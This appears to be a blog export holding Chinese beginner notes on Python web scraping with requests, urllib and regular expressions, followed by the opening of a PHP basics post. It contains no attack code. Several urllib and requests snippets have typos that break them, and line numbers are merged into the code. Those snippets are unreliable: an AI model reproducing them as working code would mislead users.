href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;duty&#x2F;&gt;ä½¿ç¨ç¾åº¦åå¿è¯»&lt;&#x2F;a&gt;&amp;nbsp; &lt;a href&#x3D;http:&#x2F;&#x2F;jianyi.baidu.com&#x2F; class&#x3D;cp-feedback&gt;æè§åé¦&lt;&#x2F;a&gt;&amp;nbsp;äº¬ICPè¯030173å·&amp;nbsp; &lt;img src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;gs.gif&gt; &lt;&#x2F;p&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;#打印响应头，是字典状态&gt;&gt;&gt; print(response.headers)&#123;&#39;Cache-Control&#39;: &#39;private, no-cache, no-store, proxy-revalidate, no-transform&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Content-Encoding&#39;: &#39;gzip&#39;, &#39;Content-Type&#39;: &#39;text&#x2F;html&#39;, &#39;Date&#39;: &#39;Mon, 27 Jan 2020 05:20:09 GMT&#39;, &#39;Last-Modified&#39;: &#39;Mon, 23 Jan 2017 13:27:32 GMT&#39;, &#39;Pragma&#39;: &#39;no-cache&#39;, &#39;Server&#39;: &#39;bfe&#x2F;1.0.8.18&#39;, &#39;Set-Cookie&#39;: &#39;BDORZ&#x3D;27315; max-age&#x3D;86400; domain&#x3D;.baidu.com; path&#x3D;&#x2F;&#39;, &#39;Transfer-Encoding&#39;: &#39;chunked&#39;&#125;#打印相应状态，200表示成功，也就是正常的请求了百度&gt;&gt;&gt; print(response.status_code)200&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)#重新的发起一次请求，这次请求就携带了headers信息&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;,headers&#x3D;headers)#在这里将响应打印，发现响用的状态码还是200，表示这次请求也是成功的&gt;&gt;&gt; print(response.status_code)200 爬虫可以抓取怎么的数据1、网页文本：如HTML文档、Json格式文本等2、图片：获取到的是二进制文件，保存为图片格式。12345678910111213爬取图片&gt;&gt;&gt; import requests#用request中的get获得这个图片的URL&gt;&gt;&gt; response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;baidu_resultlogo@2.png&#39;)#以二进制形式打印response的内容出来&gt;&gt;&gt; print(response.content)#打开要保存图片的磁盘，给图片命名，以写入的方式打开二进制，&gt;&gt;&gt; with open(&#39;D:&#x2F;&#x2F;1.gif&#39;,&#39;wb&#39;) as f: #写入response的内容 f.write(response.content) #关闭文件 f.close() 3、视频：同为二进制文件，保存为视频格式即可。4、其他：只要是能请求到的，都能获取解析方式1、直接处理2、Json解析3、正则表达式4、BeautifulSoup 5、PyQuery 6、XPath 为什么我抓到的和浏览器看到的不一样怎样解决JavaScript渲染问题 分析 Ajax请求 selenium/webdriver 怎样保存数据1、文本：纯文本，Json，Xml等 2、关系型数据库：MySQL、Oracle、SQLServer等具有结构化表结构形式存储 3、非关系型数据库：MongoDB、Redis等Key-Value形式存储 4、二进制文件：图片，视频，音频等直接保存成特定格式即可 Urllib库python内置的HTTP请求库urllib.request 请求模块urllib.error 异常处理模块urllib.parse url解析模块urllib.robotparser rebots.txt解析模块把网页请求下来urllib.request.urlopen()1234567import urllib.request#请求打开百度这个网站，将数据赋值给responesrespones &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)#阅读百度源代码print(respones.read().decode(&quot;utf-8&quot;)) 12345678import urllib.parseimport urllib.requestdata &#x3D; bytes(urllib.parse.urlencode(&#123;&#39;word&#39;:&#39;hello&#39;&#125;),encoding &#x3D; &#39;utf-8&#39;)respones &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data)print(respones.read())b&#39;&#123;\\n &quot;args&quot;: &#123;&#125;, \\n &quot;data&quot;: &quot;&quot;, \\n &quot;files&quot;: &#123;&#125;, \\n &quot;form&quot;: &#123;\\n &quot;word&quot;: &quot;hello&quot;\\n &#125;, \\n &quot;headers&quot;: &#123;\\n &quot;Accept-Encoding&quot;: &quot;identity&quot;, \\n &quot;Content-Length&quot;: &quot;10&quot;, \\n &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, \\n &quot;Host&quot;: &quot;httpbin.org&quot;, \\n &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \\n &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed849-e71b483cf9d302cdd04052a1&quot;\\n &#125;, \\n &quot;json&quot;: null, \\n &quot;origin&quot;: &quot;112.226.8.246&quot;, \\n &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;\\n&#125;\\n&#39; 设置超时时间123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;,timeout &#x3D; 1)print(response.read())b&#39;&#123;\\n &quot;args&quot;: &#123;&#125;, \\n &quot;headers&quot;: &#123;\\n &quot;Accept-Encoding&quot;: &quot;identity&quot;, \\n &quot;Host&quot;: &quot;httpbin.org&quot;, \\n &quot;User-Agent&quot;: &quot;Python-urllib&#x2F;3.8&quot;, \\n &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2ed91e-9795fe0068ea47d0c32daea0&quot;\\n &#125;, \\n &quot;origin&quot;: &quot;112.226.8.246&quot;, \\n &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;\\n&#125;\\n&#39; 响应响应类型12 状态码123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)print(response.status)200 123456import urllib.requestresponse &#x3D; urllib.request.urlopen(&quot;http:&#x2F;&#x2F;www.python.org&quot;)#read就是获取响应体的内容，这个响应体的内容是要给字节流形式，然后用decode进行解码转成utf-8print(response.read().decode(&quot;utf-8&quot;)) Request12345import urllib.requestrequest &#x3D; urllib.request.Request(&quot;http:&#x2F;&#x2F;python.org&quot;)response &#x3D; urllib.request.urlopen(request)print(response.read()).decode(&#39;utf-8&#39;) 12345678910import urllib.request,parseurl &#x3D; &#39;网址&#39;headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;对应&#39;&#125;dict &#x3D; &#123;&#39;name&#39;:&#39;Germey&#39;&#125;data &#x3D; bytes(parse.urlencode(dict),encoding&#x3D;&quot;utf-8&quot;)req &#x3D; request.Request(url&#x3D;url,data&#x3D;data,headers&#x3D;header,method&#x3D;&#39;POST&#39;)response &#x3D; request.rulopen(req)print(response.read().decode(&#39;tuf-8&#39;)) Handler代理12345678可以伪装自己的IP地址，服务器识别的IP就是代理的ipimport urllib.requestproxy_handler &#x3D; rullib,request.ProxyHandler(&#123;&#39;http&#39;&#39;http:&#x2F;&#x2F;127.0.0.1:9743&#39;&#125;)opener &#x3D; urllib.reuqest.build_opener(proxy_handler)response &#x3D; opener.open(&quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;)pritn(response.read()) URL解析urlparse Requsets123456789101112# 导入 requests 模块&gt;&gt;&gt; import requests# 接收百度这个网址，传给变量response&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#x2F;&#39;)# 查看response格式&gt;&gt;&gt; print(type(response))# 打印response的状态码&gt;&gt;&gt; print(response.status_code)# 查看response的文本类型&gt;&gt;&gt; print(type(response.text))# 打印response文本&gt;&gt;&gt; print(response.text) 请求基本GET请求基本写法12345678这是最简单的get请求# 导入 requests 模块&gt;&gt;&gt;import requests# 请求接收 httpbin网址&gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;www.httpbin.org&#x2F;get&quot;)# 打印 response文本&gt;&gt;&gt; print(response.text) 带参数GET请求1234&gt;&gt;&gt; import requests# GET请求参数就要拼接到URL后面用？问好分隔，将参数传过来用&amp;分隔&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?name&#x3D;germey&amp;age&#x3D;22&#39;)&gt;&gt;&gt; print(response.text) 以上方法是比较繁琐的，resquests提供了一个非常简单的参数。这个参数叫params 将params传入一个字典形式，这样也可以构造一个GET形式参数1234&gt;&gt;&gt; import requests&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germty&#39;,&#39;age&#39;:22&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;,params &#x3D; data)&gt;&gt;&gt; print(response.text) 解析json123456789&gt;&gt;&gt; import requests&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get&#39;)# 解析前 他是str格式&gt;&gt;&gt; print(type(response.text))&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; print(response.json())# 解析后 他是dict格式&gt;&gt;&gt; print(type(response.json()))&lt;class &#39;dict&#39;&gt; 获取二进制数据12345678910# 导入模块&gt;&gt;&gt; import requests# 获取图片网址&gt;&gt;&gt; response &#x3D; request.get(&quot;https:&#x2F;&#x2F;images2017.cnblogs.com&#x2F;blog&#x2F;777527&#x2F;201712&#x2F;777527-20171206153020144-701297613.png&quot;)# 以二进制形式打开并保存图片路径&gt;&gt;&gt; wiht open(&quot;D:&#x2F;&#x2F;json.jpg&quot;,&quot;wb&quot;) as f:# 写入其二进制内容 f.write(response.content)# 关闭文件 f.close() 添加headers1234567891011如果不加headers会被网站屏蔽&gt;&gt;&gt; import requests&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;)&gt;&gt;&gt; print(response.text)&lt;html&gt;&lt;head&gt;&lt;title&gt;400 Bad Request&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;&lt;hr&gt;&lt;center&gt;openresty&lt;&#x2F;center&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 12345加上headers就可以查看response的文本&gt;&gt;&gt; import requests&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.zhihu.com&#x2F;explore&#39;,headers &#x3D; headers)&gt;&gt;&gt; print(response.text) 基本POST请求12345678910111213141516171819202122232425262728293031# 导入模块&gt;&gt;&gt; import requests# 设置data参数&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;# 进行post请求&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)# 打印response文本&gt;&gt;&gt; print(response.text)# 这里打印的文本是str格式&#123; &quot;args&quot;: &#123;&#125;, &quot;data&quot;: &quot;&quot;, &quot;files&quot;: &#123;&#125;, &quot;form&quot;: &#123; &quot;age&quot;: &quot;22&quot;, &quot;name&quot;: &quot;germey&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*&#x2F;*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Length&quot;: &quot;18&quot;, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&quot;, &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5e2fdea2-a2bd0afafc4743c2926d9b9f&quot; &#125;, &quot;json&quot;: null, &quot;origin&quot;: &quot;112.226.8.246&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;post&quot;&#125; 12345678910111213# 导入模块&gt;&gt;&gt; import requests# 设置data参数&gt;&gt;&gt; data &#x3D; &#123;&#39;name&#39;:&#39;germey&#39;,&#39;age&#39;:&#39;22&#39;&#125;# 设置headers&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;# 进行psot请求&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,data &#x3D; data,headers &#x3D; headers)# 解析response&gt;&gt;&gt; print(response.json())# 解析之后就变成了dick格式&#123;&#39;args&#39;: &#123;&#125;, &#39;data&#39;: &#39;&#39;, &#39;files&#39;: &#123;&#125;, &#39;form&#39;: &#123;&#39;age&#39;: &#39;22&#39;, &#39;name&#39;: &#39;germey&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Length&#39;: &#39;18&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5e2fde03-cae7a73c2ed8eed413526372&#39;&#125;, &#39;json&#39;: None, &#39;origin&#39;: &#39;112.226.8.246&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;&#125; 响应response属性1234567891011121314&gt;&gt;&gt; import requests# 隐藏服务器，防止屏蔽&gt;&gt;&gt; headers &#x3D; &#123;&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36&#39;&#125;&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.jianshu.com&#39;，headers &#x3D; headers)# 打印状态码&gt;&gt;&gt; print(type(response.status_code),response.status_code)# 打印headers&gt;&gt;&gt; print(type(response.headers),response.headers)# 打印cookies&gt;&gt;&gt; print(type(response.cookies),response.cookies)# 打印url网址&gt;&gt;&gt; print(type(response.url),response.url)# 打印history也就是历史清单&gt;&gt;&gt; print(type(response.history),response.history) 状态码判断123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869一些常见的状态码为：200 - 服务器成功返回网页 404 - 请求的网页不存在 503 - 服务不可用 详细分解：1xx（临时响应） 表示临时响应并需要请求者继续执行操作的状态代码。代码 说明 100 （继续） 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。 101 （切换协议） 请求者已要求服务器切换协议，服务器已确认并准备切换。2xx （成功） 表示成功处理了请求的状态代码。代码 说明 200 （成功） 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 201 （已创建） 请求成功并且服务器创建了新的资源。 202 （已接受） 服务器已接受请求，但尚未处理。 203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。 204 （无内容） 服务器成功处理了请求，但没有返回任何内容。 205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。 206 （部分内容） 服务器成功处理了部分 GET 请求。3xx （重定向） 表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。代码 说明 300 （多种选择） 针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 301 （永久移动） 请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。 304 （未修改） 自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 305 （使用代理） 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。 307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。4xx（请求错误） 这些状态代码表示请求可能出错，妨碍了服务器的处理。代码 说明 400 （错误请求） 服务器不理解请求的语法。 401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 403 （禁止） 服务器拒绝请求。 404 （未找到） 服务器找不到请求的网页。 405 （方法禁用） 禁用请求中指定的方法。 406 （不接受） 无法使用请求的内容特性响应请求的网页。 407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 （请求超时） 服务器等候请求时发生超时。 409 （冲突） 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。 411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。 412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。 413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。 414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。 415 （不支持的媒体类型） 请求的格式不受请求页面的支持。 416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。 417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。5xx（服务器错误） 这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。代码 说明 500 （服务器内部错误） 服务器遇到错误，无法完成请求。 501 （尚未实施） 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。 503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。HttpWatch状态码Result is200 - 服务器成功返回网页，客户端请求已成功。 302 - 对象临时移动。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 304 - 属于重定向。自上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。 401 - 未授权。请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。 404 - 未找到。服务器找不到请求的网页。 2xx - 成功。表示服务器成功地接受了客户端请求。 3xx - 重定向。表示要完成请求，需要进一步操作。客户端浏览器必须采取更多操作来实现请求。例如，浏览器可能不得不请求服务器上的不同的页面，或通过代理服务器重复该请求。 4xx - 请求错误。这些状态代码表示请求可能出错，妨碍了服务器的处理。 5xx - 服务器错误。表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。 高级操作文件上传1234567# 导入模块&gt;&gt;&gt; import requests# 以只读的方式打开图片&gt;&gt;&gt; files &#x3D; &#123;&#39;file&#39;:open(&#39;D:&#x2F;&#x2F;1580132124441.png&#39;,&#39;rb&#39;)&#125;# 选择要上传的网站&gt;&gt;&gt; response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;post&#39;,files &#x3D; files)&gt;&gt;&gt; print(response.text) 获取cookie12345678910111213# 导入模块import requests# 请求接收baidu网址response &#x3D; requests.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)# 打印cookiesprint(response.cookies)# 进行循环response.cookies.items项目，将key和value合并for key,value in response.cookies.items(): print(key + &#39;&#x3D;&#39; + value) &lt;RequestsCookieJar[&lt;Cookie BDORZ&#x3D;27315 for .baidu.com&#x2F;&gt;]&gt;BDORZ&#x3D;27315 会话维持1模拟登录 1234567# 导入模块import requests# 用requests中的Session()对象s&#x3D; requests.Session()s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123546465&#39;)response &#x3D; s.get(&#39;http:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(response.text) 证书验证1234567891011import requests#如果证书不存在会报错response &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;)print(response.status_code)# 将verify设置为False之后就会打印状态码，但还是会提示最好验证证书import requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;www.12306.cn&#39;,verify &#x3D; False)print(response.status_code) 代理设置 超时设置限制服务器应答速度1234import requestsresponse &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.taobao.com&#39;,timeout &#x3D; 1 )print(response.status_code) 认证设置 异常处理 正则表达式正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。 非python独有，re模块实现 re.matchre.match 尝试从字符串的起始位置匹配一个模式，如果不是从起始位置匹配成功的话，match()就返回none.最常规的匹配12345678910# 导入 re 模块&gt;&gt;&gt; import re# 将字符串赋值给变量content&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;# 将匹配结果赋值给result变量&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\\s\\d&#123;3&#125;\\s\\d&#123;4&#125;\\s\\w&#123;10&#125;.*demo$&quot;,content)# 打印result变量&gt;&gt;&gt; print(result)# span表示打印的字符长度&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt; 泛匹配123456&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 123 4567 Whord_this is a regex demo&#39;# 将以Hello开头，demo$结尾中间的字符全都打印了出来&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello.*demo$&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 41), match&#x3D;&#39;Hello 123 4567 Whord_this is a regex demo&#39;&gt; 匹配目标123456789&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^Hello\\s(\\d+)\\sWhord.*demo$&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;#如果正则表达式出现小括号，第一个小括号的内容就是group(1) &gt;&gt;&gt; print(result.group(1))1234567 贪婪匹配123456.*贪婪匹配，尽可能多的匹配，因为其中有一个\\d+最少要有一个数字，所以只打印了7&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*(\\d+).*demo$&quot;,content)&gt;&gt;&gt; print(result.group(1))7 非贪婪匹配123456.*?非贪婪匹配，尽可能少的匹配，看到括号里的\\d这个数字了，就停止匹配，这样.*?就只匹配了Hello和空格&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;Hello 1234567 Whord_this is a regex demo&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\\d+).*demo$&quot;,content)&gt;&gt;&gt; print(result.group(1))1234567 匹配模式12345678&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_thisis a regex demo&#39;&#39;&#39;#re.S就是表示&quot;.&quot;但是这个&quot;.&quot;可以匹配换行符，如果不加re.S的话会报错因为平时的&quot;.&quot;除了换行符，可以匹配任意字符&gt;&gt;&gt; result &#x3D; re.match(&quot;^He.*?(\\d+).*?demo$&quot;,content,re.S)&gt;&gt;&gt; print(result.group(1))1234567 转义12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;price is $5.00&#39;&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \\$5\\.00&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt;&gt;&gt;&gt; result &#x3D; re.match(&quot;price is \\$5.00&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 14), match&#x3D;&#39;price is $5.00&#39;&gt; 总结:尽量使用泛匹配、使用括号得到匹配目标、尽量使用非贪婪模式、有换行符就用re.Sre.search方法re.search 扫描整个字符串并返回第一个成功的匹配re.match 方法是要从其实位置匹配，如果匹配的不是起始位置那么就会返回None123456789这里需要使用re.search方法&gt;&gt;&gt; import re&gt;&gt;&gt; content &#x3D; &#39;most recent call last&#39;&gt;&gt;&gt; content &#x3D; &#39;most recent 1235648 call last demo&#39;&gt;&gt;&gt; result &#x3D; re.search(&quot;recent.*?(\\d+).*?last&quot;,content)&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(5, 29), match&#x3D;&#39;recent 1235648 call last&#39;&gt;&gt;&gt;&gt; print(result.group(1))1235648 总结：为了匹配方便，能用search就不用matchre.findall方法搜索字符串，以列表的形式返回全部能匹配的字串 用findall方法将全部歌名打印出来 re.sub替换字符串中每一个匹配的子串后返回替换后的字符串用sub去掉a打印li中的 歌名 re.compile将正则字符串编译成正则表达式对象1将一个正则表达式串编译成正则对象，以便于复用该匹配模式 12345678910111213# 导入re模块&gt;&gt;&gt; import re# 建立一个字符串赋值给content&gt;&gt;&gt; content &#x3D; &#39;&#39;&#39;Hello 1234567 Whord_thisis a regex demo&#39;&#39;&#39;# 进行字符串编译成对象，用match方法从开头搜索&gt;&gt;&gt; pattern &#x3D; re.compile(&quot;Hello.*?demo&quot;,re.S)# 可以直接调用pattern变量，就不需要在括号里再打一遍代码&gt;&gt;&gt; result &#x3D; re.match(pattern,content)# 打印&gt;&gt;&gt; print(result)&lt;re.Match object; span&#x3D;(0, 40), match&#x3D;&#39;Hello 1234567 Whord_this\\nis a regex demo&#39;&gt;","categories":[],"tags":[]},{"title":"php","slug":"php","date":"2020-04-03T06:34:28.041Z","updated":"2020-04-03T06:34:16.000Z","comments":true,"path":"2020/04/03/php/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/php/","excerpt":"","text":"什么是PHP12345678910111213141516171819 超文本预处理器运行原理 运行在服务器端的，内嵌在html中的脚本语言 集成环境有哪些 wampserver xmapp phpstudy appserver php引擎(7.0) mysql(数据库 database) apache(服务) 为什么学习的时候用集成环境 学习入门访问： localhost 本机服务器名字&#x2F;php文件 127.0.0.1 你本机的ip地址&#x2F;php文件注意： 在写php代码的时候统统写在www目录下【开发工具】vim subline 【notepad++】 phpstrom webstrom dw NetBeans【php信息】 phpinfo();显示所有的php信息 他是模块化的，你需要什么，你必须给我开启那个模块 php.ini 123456789http:&#x2F;&#x2F;localhost&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php同样效果访问某个文件夹 默认会去访问这个文件夹下面的index.php 或者也会访问 index.html 文件夹下既有index.php也有index.html在我们的环境变量里，默认会去访问index.php 如果都没有，会将目录下的文件或文件夹列举出来文件或者目录只有放在www目录下面的文件才会被我们能访问的到我们写的PHP代码，放在根目录下面的文件夹胡总和文件里面，后对名是.php 基本语法一、初识PHP脚本程序1234567891011121314151617181920211、php开始标记&lt;?php 结束标记?&gt; &lt;?php 语句.... ?&gt; 1) &lt;?php ?&gt;这之间就表示进入了PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略 2) 可以直接嵌入到html代码中，并且 可以嵌入到html代码中的任何地方，在html文档中可以嵌入任意多个PHP标记！ 3) 文件末尾的PHP代码段结束标记可以不要，在一些情况下省略掉更好！2、指令分隔符 &quot;;&quot; 分号 1)PHP语句分为两种，一种是在程序中使用结构定义语句，另一种是在程序中使用功能执行语句，前 者结尾不需要使用分号，后者必须使用分号结尾！ 2)文件末尾的结束标志 ?&gt; 就隐含了一个分号，所以PHP代码最后一行可以不加分号 3、注释 &#x2F;*多行注释*&#x2F; &#x2F;&#x2F;单行注释4、遇到空白的处理 空格、缩进、换行这些在PHP都是无关紧要的(注意：是要在英文输入法下输入)，可以将一个语句展 开成任意行，或者紧缩在一行，使用空格和空行可以增强代码的可读性，但是要合理运用，不 然会产生阅读负担 二、变量1234567891011121314151617181920212223242526272829303132333435概述： 临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器1、变量的声明 声明：说白了就是事先通知！ 在使用变量之前要事先通知，事先声明一下！ 注意：在PHP中，使用变量的时候不需要声明 在PHP中变脸必须使用一个美元符号$ 后面跟着变量名来表示，赋值使用&#x3D;给一个变量赋值 例如： $变量名&#x3D;数值;2、变量的销毁 unset() &#x2F;&#x2F; 使用语法：unset($变量名) &lt;?php $handsome &#x3D; 25; unset($handsome); echo $handsome; ?&gt;3、变量的命名 1) 严格区分大小写 2) 